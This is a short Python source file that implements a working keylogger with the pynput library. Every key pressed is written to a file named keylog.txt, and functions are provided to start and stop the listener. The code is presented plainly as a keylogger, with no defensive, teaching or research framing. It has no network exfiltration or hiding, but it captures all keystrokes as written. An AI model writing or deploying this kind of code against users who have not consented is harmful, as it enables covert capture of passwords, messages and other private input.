from pynput import keyboard

# Global variables
keylogger_active = False
listener = None
log_file = "keylog.txt"

# Keylogger function
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{key}\n")

def start_keylogger():
    global keylogger_active, listener
    if not keylogger_active:
        keylogger_active = True
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        return "Keylogger started."

def stop_keylogger():
    global keylogger_active, listener
    if keylogger_active:
        keylogger_active = False
        if listener:
            listener.stop()
        return "Keylogger stopped."
    return "Keylogger is not running."